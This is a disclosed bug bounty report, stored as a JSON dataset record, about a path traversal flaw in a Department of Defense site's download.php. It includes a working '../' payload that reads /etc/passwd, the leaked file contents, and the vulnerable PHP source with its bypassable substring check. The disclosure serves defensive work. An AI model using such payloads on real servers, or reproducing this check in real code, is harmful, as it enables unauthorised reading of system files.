{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "sudi ",
  "title": "Local file read at https://\u2588\u2588\u2588\u2588/ [HtUS]",
  "content": "\nHeyy there,\nI have found local file read vulnerability in your website https://\u2588\u2588\u2588\u2588\u2588/\nThis the vulnerable endpoint https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/download.php?filePathDownload=data_products and the filePathDownload path is vulnerable which allows an attacker to read any local files.\nThere was some sort protection when I first checked this endpoint, as it was returning 403 forbidden status code, upon trying something similar as the hacker has shown in report #1542734 . But I was able to bypass the protection in place.\n\nSteps to reproduce:\nJust visit this url , which will display the contents of the /etc/passwd file:\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/download.php?filePathDownload=data_products/../../../../../etc/passwd\nResponse:\nCode 1.81 KiB\n1root:x:0:0:root:/root:/bin/bash\n2bin:x:1:1:bin:/bin:/sbin/nologin\n3daemon:x:2:2:daemon:/sbin:/sbin/nologin\n4adm:x:3:4:adm:/var/adm:/sbin/nologin\n5lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n6sync:x:5:0:sync:/sbin:/bin/sync\n7shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n8halt:x:7:0:halt:/sbin:/sbin/halt\n9mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n10operator:x:11:0:operator:/root:/sbin/nologin\n11ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\n12nobody:x:99:99:Nobody:/:/sbin/nologin\n13systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\n14dbus:x:81:81:System message bus:/:/sbin/nologin\n15polkitd:x:999:998:User for polkitd:/:/sbin/nologin\n16postfix:x:89:89::/var/spool/postfix:/sbin/nologin\n17sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\n18chrony:x:998:995::/var/lib/chrony:/sbin/nologin\n19ec2-user:x:1000:1000:Cloud User:/home/ec2-user:/bin/bash\n20saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin\n21mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin\n22smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin\n23sssd:x:995:993:User for sssd:/:/sbin/nologin\n24rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\n25ntp:x:38:38::/etc/ntp:/sbin/nologin\n26rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\n27nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\n28sustainment:x:1001:1001::/home/sustainment:/bin/bash\n29emerg:x:1002:1002:Sustainment Linux Emergency Acct:/home/emerg:/bin/bash\n30cwagent:x:993:992::/home/cwagent:/bin/bash\n31ssm-user:x:1003:1004::/home/ssm-user:/bin/bash\n32apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\n33tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin\n34drupal:x:1004:1005::/home/drupal:/bin/bash\n35splunk:x:1005:1006:Splunk Server:/opt/splunkforwarder:/bin/bash\n36mfe:x:992:1007::/home/mfe:/sbin/nologin\n37aoc:x:991:991:AWS OTel Collector:/home/aoc:/sbin/nologin\nAlso the content of /etc/hosts\nCode 227 Bytes\n1127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4\n2::1         localhost localhost.localdomain localhost6 localhost6.localdomain6\n3\n4\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n6\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n7\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n8\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n9\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n10\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n11\nYou can also read the source code for the available php files such as index.php,download.php\nHere's the source code for download.php\nhttps://\u2588\u2588\u2588\u2588\u2588/download.php?filePathDownload=data_products/../download.php\nCode 3.17 KiB\n1<?php\n2\n3function checkPath($path){\n4\n5  if(!contains($path, \"data_products\")){\n6\n7    ob_clean();\n8    http_response_code(403);\n9\tthrow new RuntimeException('File Not Found Error');  \n10    exit();\n11    \n12  }\n13\t\t\n14\t\n15}\n16\n17function startsWith( $haystack, $needle ) {\n18     $length = strlen( $needle );\n19     return substr( $haystack, 0, $length ) === $needle;\n20}\n21\n22function contains( $haystack, $needle ) {\n23     return strpos($haystack, $needle) !== false;\n24}\n25\n26if(isset($_REQUEST[\"file\"]) && isset($_REQUEST['linkpath'])){\n27 $linkpath=$_REQUEST['linkpath'];\n28    echo $file = htmlspecialchars(urldecode(base64_decode($_REQUEST[\"file\"]))); // Decode URL-encoded string\n29    echo   $filepath =  $linkpath.'/'.$file;\n30    checkPath($filepath);\n31    if(is_file($filepath)){\n32                    ob_clean();\n33                    header(\"Pragma: public\");\n34                    header(\"Expires: 0\");\n35                    header(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\");\n36                    header(\"Cache-Control: private\",false);\n37                   //header('Content-Type: application/pdf');\n38                    header('Content-Type: application/octet-stream');\n39                    header(\"Content-Disposition: attachment; filename=\\\"\".basename($filepath).\"\\\";\");\n40                    header(\"Content-Transfer-Encoding: binary\");\n41                    header(\"Content-Length: \".filesize($filepath));\n42                    readfile($filepath);\n43    }else{\n44    echo 'File Not Found ';\n45    }\n46}\n47if(isset($_REQUEST[\"filedownload\"])){\n48\n49   echo  $filepath = htmlspecialchars(urldecode(base64_decode($_REQUEST[\"filedownload\"]))); // Decode URL-encoded string\n50   die;//  $filepath = $_REQUEST[\"filedownload\"];\n51   checkPath($filepath);\n52    if(is_file($filepath)){\n53                    ob_clean();\n54                    header(\"Pragma: public\");\n55                    header(\"Expires: 0\");\n56                    header(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\");\n57                    header(\"Cache-Control: private\",false);\n58                    header('Content-Type: application/octet-stream');\n59                    header(\"Content-Disposition: attachment; filename=\\\"\".basename($filepath).\"\\\";\");\n60                    header(\"Content-Transfer-Encoding: binary\");\n61                    header(\"Content-Length: \".filesize($filepath));\n62                    readfile($filepath);\n63    }else{\n64    echo 'File Not Found ';\n65    }\n66}\n67\n68if(isset($_REQUEST[\"filePathDownload\"])){\n69\n70   echo  $filepath = htmlspecialchars(urldecode($_REQUEST[\"filePathDownload\"]));\n71    checkPath($filepath);\n72     \n73    if(is_file($filepath)){\n74                    ob_clean();\n75                    header(\"Pragma: public\");\n76                    header(\"Expires: 0\");\n77                    header(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\");\n78                    header(\"Cache-Control: private\",false);\n79                    header('Content-Type: application/octet-stream');\n80                    header(\"Content-Disposition: attachment; filename=\\\"\".basename($filepath).\"\\\";\");\n81                    header(\"Content-Transfer-Encoding: binary\");\n82                    header(\"Content-Length: \".filesize($filepath));\n83                    readfile($filepath);\n84    }else{\n85    echo 'File Not Found ';\n86    }\n87}\n88\n89?>\n\nImpact\nImpact:\nAn attacker can read any local files,I haven't looked much into the local files but as there many users in the system I might be able to get access to something very sensitive.\nThankyou\nRegards\nSudhanshu\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal: '.../...//'"
  ],
  "screenshots": {},
  "disclosed_date": 1665769860,
  "report_url": "https://hackerone.com/reports/1626210",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Visit the vulnerable endpoint: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/download.php?filePathDownload=data_products/../../../../../etc/passwd"
    ],
    [
      2,
      "Observe the contents of the /etc/passwd file displayed in the response"
    ]
  ],
  "vuln_description": "The vulnerability is a local file read issue in the download.php endpoint, where the filePathDownload parameter is not properly sanitized, allowing directory traversal attacks. This enables an attacker to read any file on the server by manipulating the filePathDownload parameter with relative paths (e.g., '../../../../../etc/passwd').",
  "reason": "The vulnerability involves a straightforward directory traversal attack, which is a well-known and common type of vulnerability. The attacker only needed to manipulate a single parameter in a predictable way to bypass the initial protection (which checked for the presence of 'data_products' in the path). This does not involve complex application states, multiple components, or novel logic.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "1542734"
}